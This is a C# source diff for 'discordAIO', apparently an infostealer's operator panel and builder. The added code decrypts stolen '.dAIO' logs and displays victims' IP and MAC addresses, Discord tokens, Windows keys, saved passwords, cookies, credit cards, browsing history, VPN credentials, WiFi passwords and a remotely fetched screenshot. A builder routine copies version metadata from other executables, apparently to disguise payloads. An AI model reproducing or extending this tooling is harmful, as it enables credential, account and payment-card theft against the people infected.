@@ -13,6 +13,7 @@ using System.Linq;
 using System.Net;
 using System.Security.Cryptography;
 using System.Text;
+using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -26,7 +27,7 @@ namespace discordAIO
     public partial class main : Form
     {
 
-        private string version = "v1.0";
+        private string version = "v0.3";
         private protected string email = "fmediolanek@gmail.com";
         private protected static string dAIOPass = "ceDUsRGbwAdcjUqHWkMLgARDrkx4hNJ28WbS6fPjr7cYQ87BKJTRFcUKRbJMMxeWDTEy3k9jsLSVFFV9heDeuWYfECHDzpmgYrttCMuLZRBtuPzuSJ846YBZhCa88Qj2fAaNJuuw6fhZBZfANEbRkXvaupN8rtDQVqrvLKnKW5ESAueQ2pz4QJnTdkDdM3rapFk9mU5DNP9MGAX8zymZW2MxLfj5C4p7PkPRYBxbTyawuQR9uaJZCr4bsSDhnCh2XT5CSUzHBFcVgWS7W5W9Z7SkUe4ehtymPawpwg58mpnN36sgWVSGeFXVzbQcXjfqjcUFcR8T2gBc6Ajm9wMjhCMgMNbmCMBjHKhcLghkeGWhw5wHWNZXhnDDFxnA8U4SzqdMkfTZCeaqTBaTASzKsRmGzeBGpdA9CHkLLxtJfxwj9LQ4vafzercmLJWPWGjpyeuM7CyN7ZgRbP9J6w4wzT3bxdtQXtm8RPVq5AKA6y66pSt5rdBaGbZxUjAHD2se";
 
@@ -39,15 +40,17 @@ namespace discordAIO
             webhooksPage.Visible = false;
             tokensPage.Visible = false;
             builderPage.Visible = false;
+            daioPage.Visible = false;
+            credentialsPage.Visible = false;
+            ssPage.Visible = false;
 
+            label46.Text = version;
 
             // Utils
             this._randomChars = new RandomCharacters();
             this.randomFileInfo_0 = new RandomInfo(this.randomCharacters_0);
 
             CheckProtection();
-
-
             Scintilla();
             DiscordRPC();
         }
@@ -161,7 +164,10 @@ namespace discordAIO
             webhooksPage.Visible = false;
             tokensPage.Visible = false;
             builderPage.Visible = false;
+            daioPage.Visible = false;
             mainPage.Visible = true;
+            credentialsPage.Visible = false;
+            ssPage.Visible = false;
         }
 
         private void button4_Click(object sender, EventArgs e) // Webhooks button
@@ -170,18 +176,10 @@ namespace discordAIO
             mainPage.Visible = false;
             tokensPage.Visible = false;
             builderPage.Visible = false;
+            daioPage.Visible = false;
+            credentialsPage.Visible = false;
+            ssPage.Visible = false;
         }
-
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -538,6 +536,9 @@ namespace discordAIO
             webhooksPage.Visible = false;
             mainPage.Visible = false;
             builderPage.Visible = false;
+            daioPage.Visible = false;
+            credentialsPage.Visible = false;
+            ssPage.Visible = false;
         }
 
         private void button2_Click(object sender, EventArgs e)
@@ -546,6 +547,9 @@ namespace discordAIO
             tokensPage.Visible = false;
             webhooksPage.Visible = false;
             mainPage.Visible = false;
+            daioPage.Visible = false;
+            credentialsPage.Visible = false;
+            ssPage.Visible = false;
         }
 
         // Handlers
@@ -760,37 +764,34 @@ namespace discordAIO
                 OpenFileDialog cloningDialog = new OpenFileDialog();
                 cloningDialog.Filter = "Executable (*.exe)|*.exe";
 
-                if (cloningDialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+                if (cloningDialog.ShowDialog() == DialogResult.OK)
                 {
-                    FileVersionInfo info = FileVersionInfo.GetVersionInfo(Path.GetDirectoryName(cloningDialog.FileName) + "\\" + cloningDialog.FileName);
+                    string path = Path.GetFullPath(cloningDialog.FileName);
 
-                    using (Stream fs = File.Open(Path.GetDirectoryName(cloningDialog.FileName) + "\\" + cloningDialog.FileName, FileMode.Open, FileAccess.ReadWrite))
-                    {
-                    //    BitmapDecoder decoder =
-                    //    BitmapDecoder.Create(fs, BitmapCreateOptions.None, BitmapCacheOption.Default);
-                    //    BitmapFrame frame = decoder.Frames[0]; // the first frame with the metadata
-                    //    BitmapMetadata metadata = frame.Metadata as BitmapMetadata;
-                    //    if (metadata != null)
-                     //   {
-                    //        mTitle = metadata.Title;
-//
-                     //       mCompany = metadata.Author.ToString();
-                     //       mCopyright = metadata.Copyright;
-                            // examine metadata.Title, metadata.Copyright
-                     //   }
-                        fs.Close();
-                    }
+                    FileVersionInfo info = FileVersionInfo.GetVersionInfo(path);
+                    mTitle = info.OriginalFilename;
+                    mDescription = info.FileDescription;
+                    mProduct = info.ProductName;
+                    mCompany = info.CompanyName;
+                    mCopyright = info.LegalCopyright;
+                    mTrademark = info.LegalTrademarks;
+                    mMajorVersion = info.FileMajorPart.ToString();
+                    mMinorVersion = info.FileMinorPart.ToString();
+                    mBuildPart = info.FileBuildPart.ToString();
+                    mPrivatePart = info.FileBuildPart.ToString();
 
                 }
-                label24.Text = mDescription;
-                MessageBox.Show(mTitle);
-                MessageBox.Show(mCompany);
-                MessageBox.Show(mCopyright);
-                MessageBox.Show(Path.GetDirectoryName(cloningDialog.FileName) + "\\" + cloningDialog.FileName);
+                if (mDescription == "")
+                {
+                    label24.Text = mProduct;
+                } else
+                {
+                    label24.Text = mDescription;
+                }
             }
-            catch
+            catch (Exception ex)
             {
-                MessageBox.Show("Something went wrong.", "Discord AIO");
+                MessageBox.Show(ex.ToString());
             }
         }
 
@@ -823,6 +824,257 @@ namespace discordAIO
             {
                 pictureBox4.BackColor = Color.FromArgb(dlg.Color.A, dlg.Color.R, dlg.Color.G, dlg.Color.B);
             }
+        }
+
+        // .dAIO
+        private void button18_Click(object sender, EventArgs e)
+        {
+            string ipData = "N/A";
+            string nameData = "N/A";
+            string tokenData = "N/A";
+            string macData = "N/A";
+            string link = "N/A";
+            string winkeyData = "N/A";
+            string passwordsData = "N/A";
+            string cookiesData = "N/A";
+            string ccData = "N/A";
+            string hisData = "N/A";
+            string vpnData = "N/A";
+            string wpData = "N/A";
+            string wnData = "N/A";
+            try
+            {
+                using (OpenFileDialog open = new OpenFileDialog())
+                {
+                    open.Filter = "dAIO (*.dAIO)|*.dAIO";
+                    if (open.ShowDialog() == DialogResult.OK)
+                    {
+                        string creText = File.ReadAllText(open.FileName);
+                        string decryptedText = Decrypt(creText);
+
+                        string directoryPath = Path.GetDirectoryName(open.FileName);
+                        textBox8.Text = directoryPath;
+
+                        creText = creText.Replace(creText, decryptedText);
+                        File.WriteAllText(open.FileName, creText);
+
+                        ipData = getBetween(decryptedText, "IP Address: ", " |");
+                        nameData = getBetween(decryptedText, "Desktop name: ", " |");
+                        macData = getBetween(decryptedText, "MAC Address: ", " |");
+
+                        string[] lines = File.ReadAllLines(open.FileName);
+                        for (int i = 0; i < lines.Length; i++)
+                        {
+                            if (lines[i].Contains("# End of Tokens") && i >= 2)
+                            {
+                                tokenData = lines[i - 2];
+                            }
+                        }
+
+                        string encryptedText = Encrypt(creText);
+                        creText = creText.Replace(creText, encryptedText);
+                        File.WriteAllText(open.FileName, creText);
+
+                        if (decryptedText.Contains("# Windows"))
+                        {
+                            winkeyData = getBetween(decryptedText, "Key: ", " |");
+                        }
+
+                        if (decryptedText.Contains("# Passwords"))
+                        {
+                            passwordsData = getBetween(decryptedText, "# Passwords", "# End of Passwords");
+                            listBox1.Items.Clear();
+
+                            foreach (string s in Regex.Split(passwordsData, "\n"))
+                                listBox1.Items.Add(s);
+                        }
+                        else
+                        {
+                            listBox1.Items.Clear();
+                            listBox1.Items.Add(passwordsData);
+                        }
+
+                        if (decryptedText.Contains("# Cookies"))
+                        {
+                            cookiesData = getBetween(decryptedText, "Cookies", "# End of Cookies");
+                            listBox2.Items.Clear();
+
+                            foreach (string s in Regex.Split(cookiesData, "\n"))
+                                listBox2.Items.Add(s);
+                        }
+                        else
+                        {
+                            listBox2.Items.Clear();
+                            listBox2.Items.Add(cookiesData);
+                        }
+
+
+                        if (decryptedText.Contains("# Credit Cards"))
+                        {
+                            ccData = getBetween(decryptedText, "Credit Cards", "# End of Credit Cards");
+                            listBox3.Items.Clear();
+
+                            foreach (string s in Regex.Split(ccData, "\n"))
+                                listBox3.Items.Add(s);
+                        }
+                        else
+                        {
+                            listBox3.Items.Clear();
+                            listBox3.Items.Add(ccData);
+                        }
+
+                        if (decryptedText.Contains("# History"))
+                        {
+                            hisData = getBetween(decryptedText, "History", "# End of History");
+                            listBox4.Items.Clear();
+
+                            foreach (string s in Regex.Split(hisData, "\n"))
+                                listBox4.Items.Add(s);
+                        }
+                        else
+                        {
+                            listBox4.Items.Clear();
+                            listBox4.Items.Add(hisData);
+                        }
+
+
+
+                        if (decryptedText.Contains("# NordVPN"))
+                        {
+                            vpnData = getBetween(decryptedText, "NordVPN", "# End of NordVPN");
+                            listBox5.Items.Clear();
+
+                            foreach (string s in Regex.Split(vpnData, "\n"))
+                                listBox5.Items.Add(s);
+                        }
+                        else
+                        {
+                            listBox5.Items.Clear();
+                            listBox5.Items.Add(vpnData);
+                        }
+
+                        if (decryptedText.Contains("# Wifi Network"))
+                        {
+                            wnData = getBetween(decryptedText, "Wifi Network", "# End of Wifi Network");
+                            listBox6.Items.Clear();
+
+                            foreach (string s in Regex.Split(wnData, "\n"))
+                                listBox6.Items.Add(s);
+                        }
+                        else
+                        {
+                            listBox6.Items.Clear();
+                            listBox6.Items.Add(wnData);
+                        }
+
+
+                        if (decryptedText.Contains("# Wifi Password") && decryptedText.Contains("# Wifi Network"))
+                        {
+                            wpData = getBetween(decryptedText, "Wifi Password", "# End of Wifi Password");
+                        //    listBox6.Items.Clear();
+
+                            foreach (string s in Regex.Split(wpData, "\n"))
+                                listBox6.Items.Add(s);
+                        }
+                        else
+                        {
+                            listBox6.Items.Clear();
+                            listBox6.Items.Add(wpData);
+                        }
+
+
+                        textBox9.Text = nameData;
+                        textBox10.Text = ipData;
+                        textBox12.Text = tokenData;
+                        textBox11.Text = macData;
+                        textBox13.Text = winkeyData;
+
+
+                        if (decryptedText.Contains("picURL"))
+                        {
+                            link = getBetween(decryptedText, "picURL: ", " |");
+
+                            var request = WebRequest.Create(link);
+
+                            using (var response = request.GetResponse())
+                            using (var stream = response.GetResponseStream())
+                            {
+                                pictureBox5.Invoke(new Action(delegate ()
+                                {
+                                    pictureBox5.Image = Bitmap.FromStream(stream);
+                                }));
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.ToString());
+            }
+        }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            builderPage.Visible = false;
+            tokensPage.Visible = false;
+            webhooksPage.Visible = false;
+            mainPage.Visible = false;
+            daioPage.Visible = true;
+        }
+
+        Image zoomImg;
+
+        // SS
+        private void button19_Click(object sender, EventArgs e)
+        {
+            zoomImg = pictureBox5.Image;
+            builderPage.Visible = false;
+            tokensPage.Visible = false;
+            webhooksPage.Visible = false;
+            mainPage.Visible = false;
+            daioPage.Visible = false;
+            credentialsPage.Visible = false;
+            ssPage.Visible = true;
+        }
+
+        // Image resizer
+        Image Zoom(Image img, Size size)
+        {
+            Bitmap bmp = new Bitmap(img, img.Width + (img.Width * size.Width / 100), img.Height + (img.Height * size.Height / 100));
+            Graphics g = Graphics.FromImage(bmp);
+            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
+            return bmp;
+        }
+        private void hScrollBar1_Scroll(object sender, ScrollEventArgs e)
+        {
+            if (pictureBox5 == null || pictureBox5.Image == null)
+            {
+            } 
+            else
+            {
+                if (hScrollBar1.Value > 0)
+                {
+                    pictureBox5.Image = Zoom(zoomImg, new Size(hScrollBar1.Value, hScrollBar1.Value));
+                }
+            }
+
+        }
+
+        private void button20_Click(object sender, EventArgs e)
+        {
+            builderPage.Visible = false;
+            tokensPage.Visible = false;
+            webhooksPage.Visible = false;
+            mainPage.Visible = false;
+            daioPage.Visible = false;
+            ssPage.Visible = false;
+            credentialsPage.Visible = true;
+        }
+
+        private void pictureBox6_Click(object sender, EventArgs e)
+        {
+            Process.Start("https://discord.gg/qjrDprutvg");
         }
     }
 }
